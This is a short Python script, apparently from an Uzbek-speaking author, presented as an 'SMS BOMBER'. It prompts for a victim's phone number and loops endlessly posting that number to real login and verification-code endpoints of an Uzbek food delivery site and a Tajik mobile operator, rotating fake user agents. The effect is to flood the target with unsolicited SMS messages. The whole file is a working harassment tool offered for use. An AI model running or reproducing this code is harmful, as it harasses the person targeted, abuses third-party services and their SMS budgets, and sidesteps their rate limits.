import requests, fake_useragent, time
import pyfiglet
from termcolor import colored

text=pyfiglet.print_figlet(text="SMS BOMBER", colors="BLUE")
print("Ja3oli Tomonidan Yaratilgan Dastur")

menu_options = ('1', '2')

while True:
    print()
    print(colored('** MENULAR **' , 'yellow'))
    print(colored('1: Foydalanish', 'green'))
    print(colored('2: Sms Bomber', 'green'))

    print()
    user_input = input('Shulardan Bitasini Tanlang: ')

    if user_input in menu_options:
        break

    else:
        print()
        print('Xatolik Shulardan Bitasini Tanlang')

if user_input == '1':
    print()
    print('Uzbekiston Raqamiga Sms Bomber Qilish Uchun +998 Bolsin')
    print('Tojikiston Raqamiga Sms Bomber Qilish Uchun 992')

elif user_input == '2':
    print(' * Modullar Yuklanmoqda...')
    time.sleep(5)
    print()
    
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}
    NUMBER = input(colored('Telfon Raqamingizni Kiriting: (Misol Uchun +998) ' , 'red') )

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}

    try:
        response = requests.post('https://io.bellissimo.uz/api/verify-web', headers=headers, data={'phone' : NUMBER})
        print(colored('* Xabar Yuborilmoqda', 'blue'))
    except:
        time.sleep(1)

    try:
        response = requests.post('http://my.tcell.tj/api/v3/auth/send-code/', headers=headers, data={'phone' : NUMBER})
        print(colored('* Xabar Yuborilmoqda', 'blue'))
    except:
        time.sleep(1)
